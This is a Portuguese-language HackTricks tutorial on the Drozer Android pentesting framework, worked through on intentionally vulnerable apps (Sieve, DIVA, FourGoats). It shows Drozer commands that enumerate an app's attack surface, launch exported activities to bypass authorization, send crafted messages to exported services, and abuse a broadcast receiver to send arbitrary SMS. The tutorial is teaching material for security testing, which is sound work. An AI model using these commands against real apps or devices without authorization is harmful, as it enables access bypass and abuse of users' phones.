# Tutorial do Drozer

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o [reposit√≥rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

<img src="../../../.gitbook/assets/i3.png" alt="" data-size="original">

**Dica de bug bounty**: **inscreva-se** no **Intigriti**, uma plataforma premium de **bug bounty criada por hackers, para hackers**! Junte-se a n√≥s em [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoje e comece a ganhar recompensas de at√© **$100.000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## APKs para testar

* [Sieve](https://github.com/mwrlabs/drozer/releases/download/2.3.4/sieve.apk) (do mrwlabs)
* [DIVA](https://payatu.com/wp-content/uploads/2016/01/diva-beta.tar.gz)

## Instala√ß√£o

Instale o Cliente Drozer em seu host. Baixe-o das [√∫ltimas vers√µes](https://github.com/mwrlabs/drozer/releases).
```bash
pip install drozer-2.4.4-py2-none-any.whl
pip install twisted
pip install service_identity
```
Baixe e instale o APK do drozer nas [√∫ltimas vers√µes](https://github.com/mwrlabs/drozer/releases). No momento, √© [este](https://github.com/mwrlabs/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk).
```
adb install drozer.apk
```
### Iniciando o Servidor

O agente est√° sendo executado na porta 31415, precisamos fazer um [redirecionamento de porta](https://pt.wikipedia.org/wiki/Redirecionamento_de_portas) para estabelecer a comunica√ß√£o entre o Cliente Drozer e o Agente. Aqui est√° o comando para fazer isso:
```
adb forward tcp:31415 tcp:31415
```
Por fim, **inicie** o **aplicativo** e pressione o bot√£o "**ON**"

![](<../../../.gitbook/assets/image (63).png>)

E conecte-se a ele:
```
drozer console connect
```
## Comandos Interessantes

| **Comandos**    | **Descri√ß√£o**                                                                                                                                        |
| --------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Help MODULE** | Mostra a ajuda do m√≥dulo selecionado.                                                                                                                 |
| **list**        | Mostra uma lista de todos os m√≥dulos do drozer que podem ser executados na sess√£o atual. Isso oculta m√≥dulos que voc√™ n√£o tem permiss√µes apropriadas para executar. |
| **shell**       | Inicia um shell Linux interativo no dispositivo, no contexto do Agente.                                                                                |
| **clean**       | Remove arquivos tempor√°rios armazenados pelo drozer no dispositivo Android.                                                                            |
| **load**        | Carrega um arquivo contendo comandos drozer e os executa em sequ√™ncia.                                                                                  |
| **module**      | Encontra e instala m√≥dulos drozer adicionais da Internet.                                                                                               |
| **unset**       | Remove uma vari√°vel nomeada que o drozer passa para quaisquer shells Linux que ele inicia.                                                               |
| **set**         | Armazena um valor em uma vari√°vel que ser√° passada como uma vari√°vel de ambiente para quaisquer shells Linux iniciados pelo drozer.                     |
| **shell**       | Inicia um shell Linux interativo no dispositivo, no contexto do Agente.                                                                                |
| **run MODULE**  | Executa um m√≥dulo drozer.                                                                                                                              |
| **exploit**     | Drozer pode criar exploits para executar no dispositivo. `drozer exploit list`                                                                          |
| **payload**     | Os exploits precisam de um payload. `drozer payload list`                                                                                               |

### Pacote

Encontre o **nome** do pacote filtrando por parte do nome:
```
dz> run app.package.list -f sieve  
com.mwr.example.sieve
```
**Informa√ß√µes b√°sicas** do pacote:
```
dz> run app.package.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
Process Name: com.mwr.example.sieve
Version: 1.0
Data Directory: /data/data/com.mwr.example.sieve
APK Path: /data/app/com.mwr.example.sieve-2.apk
UID: 10056
GID: [1028, 1015, 3003]
Shared Libraries: null
Shared User ID: null
Uses Permissions:
 - android.permission.READ_EXTERNAL_STORAGE
 - android.permission.WRITE_EXTERNAL_STORAGE
 - android.permission.INTERNET
Defines Permissions:
 - com.mwr.example.sieve.READ_KEYS
 - com.mwr.example.sieve.WRITE_KEYS
```
Leia **Manifest**:
```
run app.package.manifest jakhar.aseem.diva
```
**Superf√≠cie de ataque** do pacote:
```
dz> run app.package.attacksurface com.mwr.example.sieve
Attack Surface:
 3 activities exported
 0 broadcast receivers exported
 2 content providers exported
 2 services exported
 is debuggable
```
* **Atividades**: Talvez voc√™ possa iniciar uma atividade e contornar algum tipo de autoriza√ß√£o que deveria impedi-lo de lan√ß√°-la.
* **Provedores de conte√∫do**: Talvez voc√™ possa acessar dados privados ou explorar alguma vulnerabilidade (Inje√ß√£o de SQL ou Traversal de Caminho).
* **Servi√ßos**:
* **is debuggable**: [Saiba mais](./#is-debuggeable)

### Atividades

O valor "android:exported" de um componente de atividade exportado √© definido como **"true"** no arquivo AndroidManifest.xml:
```markup
<activity android:name="com.my.app.Initial" android:exported="true">
</activity>
```
**Listar atividades exportadas**:

Para listar as atividades exportadas de um aplicativo Android, voc√™ pode usar o Drozer. Primeiro, inicie o Drozer e conecte-se ao dispositivo Android de destino. Em seguida, execute o seguinte comando:

```
run app.activity.info -a <nome do pacote do aplicativo>
```

Isso retornar√° uma lista de todas as atividades exportadas pelo aplicativo. As atividades exportadas podem ser exploradas por um invasor para acessar recursos do aplicativo que n√£o deveriam ser acess√≠veis publicamente.
```
dz> run app.activity.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
 com.mwr.example.sieve.FileSelectActivity
 com.mwr.example.sieve.MainLoginActivity
 com.mwr.example.sieve.PWList
```
**Iniciar atividade**:

Talvez voc√™ possa iniciar uma atividade e contornar algum tipo de autoriza√ß√£o que deveria impedir que voc√™ a iniciasse.
```
dz> run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList
```
Voc√™ tamb√©m pode iniciar uma atividade exportada pelo **adb**:

* O nome do pacote √© com.example.demo
* O nome da atividade exportada √© com.example.test.MainActivity
```
adb shell am start -n com.example.demo/com.example.test.MainActivity
```
### Provedores de Conte√∫do

Este post √© muito grande para estar aqui, ent√£o **voc√™ pode** [**acess√°-lo em sua pr√≥pria p√°gina aqui**](exploiting-content-providers.md).

### Servi√ßos

Um servi√ßo exportado √© declarado dentro do Manifest.xml:
```markup
<service android:name=".AuthService" android:exported="true" android:process=":remote"/>
```
Dentro do c√≥digo, **verifique** a fun√ß√£o `handleMessage` que ir√° **receber** a **mensagem**:

![](<../../../.gitbook/assets/image (194).png>)

#### Listar servi√ßo
```
dz> run app.service.info -a com.mwr.example.sieve 
Package: com.mwr.example.sieve
  com.mwr.example.sieve.AuthService
    Permission: null
  com.mwr.example.sieve.CryptoService
    Permission: null
```
#### **Interagir** com um servi√ßo
```
app.service.send            Send a Message to a service, and display the reply  
app.service.start           Start Service                                       
app.service.stop            Stop Service
```
#### Exemplo

D√™ uma olhada na ajuda do **drozer** para `app.service.send`:

![](<../../../.gitbook/assets/image (196) (1).png>)

Observe que voc√™ enviar√° primeiro os dados dentro de "_msg.what_", depois "_msg.arg1_" e "_msg.arg2_", voc√™ deve verificar dentro do c√≥digo **quais informa√ß√µes est√£o sendo usadas** e onde.\
Usando a op√ß√£o `--extra`, voc√™ pode enviar algo interpretado por "_msg.replyTo"_, e usando `--bundle-as-obj` voc√™ cria um objeto com os detalhes fornecidos.

No exemplo a seguir:

* `what == 2354`
* `arg1 == 9234`
* `arg2 == 1`
* `replyTo == object(string com.mwr.example.sieve.PIN 1337)`
```
run app.service.send com.mwr.example.sieve com.mwr.example.sieve.AuthService --msg 2354 9234 1 --extra string com.mwr.example.sieve.PIN 1337 --bundle-as-obj
```
![](<../../../.gitbook/assets/image (195).png>)

### Receptores de Transmiss√£o

Os aplicativos Android podem enviar ou receber mensagens de transmiss√£o do sistema Android e de outros aplicativos Android, semelhante ao padr√£o de design [publicar-assinar](https://en.wikipedia.org/wiki/Publish%E2%80%93subscribe\_pattern). Essas transmiss√µes s√£o enviadas quando ocorre um evento de interesse. Por exemplo, o sistema Android envia transmiss√µes quando v√°rios eventos do sistema ocorrem, como quando o sistema √© iniciado ou o dispositivo come√ßa a carregar. Os aplicativos tamb√©m podem enviar transmiss√µes personalizadas, por exemplo, para notificar outros aplicativos sobre algo que possa ser de interesse para eles (por exemplo, alguns novos dados foram baixados).

Os aplicativos podem se registrar para receber transmiss√µes espec√≠ficas. Quando uma transmiss√£o √© enviada, o sistema automaticamente encaminha as transmiss√µes para aplicativos que se inscreveram para receber esse tipo espec√≠fico de transmiss√£o.

Isso pode aparecer dentro do arquivo Manifest.xml:
```markup
<receiver android:name=".MyBroadcastReceiver"  android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED"/>
        <action android:name="android.intent.action.INPUT_METHOD_CHANGED" />
    </intent-filter>
</receiver>
```
De: [https://developer.android.com/guide/components/broadcasts](https://developer.android.com/guide/components/broadcasts)

Depois de descobrir esses receptores de transmiss√£o, voc√™ deve **verificar o c√≥digo** deles. Preste aten√ß√£o especial √† fun√ß√£o \*\*`onReceive`\*\* pois ela ser√° respons√°vel por lidar com as mensagens recebidas.

#### **Detectar todos** os receptores de transmiss√£o
```bash
run app.broadcast.info #Detects all
```
#### Verificar receptores de transmiss√£o de um aplicativo

Para verificar os receptores de transmiss√£o de um aplicativo, podemos usar o m√≥dulo `broadcast` do Drozer. Este m√≥dulo nos permite listar todos os receptores de transmiss√£o registrados em um aplicativo e enviar uma transmiss√£o para um receptor espec√≠fico.

Para listar todos os receptores de transmiss√£o de um aplicativo, podemos usar o seguinte comando:

```
dz> run app.broadcast.info -a <package_name>
```

Isso nos dar√° uma lista de todos os receptores de transmiss√£o registrados no aplicativo especificado.

Para enviar uma transmiss√£o para um receptor espec√≠fico, podemos usar o seguinte comando:

```
dz> run app.broadcast.send --component <component_name> --extra <extra_key>:<extra_value>
```

Isso enviar√° uma transmiss√£o para o receptor especificado com os extras especificados. Certifique-se de que o componente e os extras estejam corretos para evitar erros.
```bash
#Check one negative
run app.broadcast.info -a jakhar.aseem.diva
Package: jakhar.aseem.diva
  No matching receivers.

# Check one positive
run app.broadcast.info -a com.google.android.youtube
Package: com.google.android.youtube
  com.google.android.libraries.youtube.player.PlayerUiModule$LegacyMediaButtonIntentReceiver
    Permission: null
  com.google.android.apps.youtube.app.common.notification.GcmBroadcastReceiver
    Permission: com.google.android.c2dm.permission.SEND
  com.google.android.apps.youtube.app.PackageReplacedReceiver
    Permission: null
  com.google.android.libraries.youtube.account.AccountsChangedReceiver
    Permission: null
  com.google.android.apps.youtube.app.application.system.LocaleUpdatedReceiver
    Permission: null
```
#### Intera√ß√µes de Broadcast
```
app.broadcast.info          Get information about broadcast receivers           
app.broadcast.send          Send broadcast using an intent                      
app.broadcast.sniff         Register a broadcast receiver that can sniff particular intents
```
#### Enviar uma mensagem

Neste exemplo, abusando do Content Provider do apk [FourGoats](https://github.com/linkedin/qark/blob/master/tests/goatdroid.apk), voc√™ pode **enviar um SMS arbitr√°rio** para qualquer destino n√£o-premium **sem pedir** permiss√£o ao usu√°rio.

![](<../../../.gitbook/assets/image (199).png>)

![](<../../../.gitbook/assets/image (197) (1).png>)

Se voc√™ ler o c√≥digo, os par√¢metros "_phoneNumber_" e "_message_" devem ser enviados para o Content Provider.
```
run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --component org.owasp.goatdroid.fourgoats.broadcastreceivers SendSMSNowReceiver --extra string phoneNumber 123456789 --extra string message "Hello mate!"
```
### √â depur√°vel

Um APK de produ√ß√£o nunca deve ser depur√°vel. Isso significa que voc√™ pode **anexar um depurador Java** √† aplica√ß√£o em execu√ß√£o, inspecion√°-la em tempo de execu√ß√£o, definir pontos de interrup√ß√£o, avan√ßar passo a passo, coletar valores de vari√°veis e at√© mesmo alter√°-los. [O InfoSec Institute tem um excelente artigo](../exploiting-a-debuggeable-applciation.md) sobre como aprofundar quando sua aplica√ß√£o √© depur√°vel e injetar c√≥digo em tempo de execu√ß√£o.

Quando um aplicativo √© depur√°vel, ele aparecer√° no Manifesto:
```
<application theme="@2131296387" debuggable="true"
```
Voc√™ pode encontrar todos os aplicativos depur√°veis com o **Drozer**:
```
run app.package.debuggable
```
## Tutoriais

* [https://resources.infosecinstitute.com/android-penetration-tools-walkthrough-series-drozer/#gref](https://resources.infosecinstitute.com/android-penetration-tools-walkthrough-series-drozer/#gref)
* [http://mobiletools.mwrinfosecurity.com/Using-Drozer-for-application-security-assessments/](http://mobiletools.mwrinfosecurity.com/Using-Drozer-for-application-security-assessments/)

## Mais informa√ß√µes

* [https://blog.dixitaditya.com/android-pentesting-cheatsheet/](https://blog.dixitaditya.com/android-pentesting-cheatsheet/)



<img src="../../../.gitbook/assets/i3.png" alt="" data-size="original">

**Dica de recompensa por bugs**: **inscreva-se** na **Intigriti**, uma plataforma premium de **recompensas por bugs criada por hackers, para hackers**! Junte-se a n√≥s em [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoje e comece a ganhar recompensas de at√© **$100.000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o [reposit√≥rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
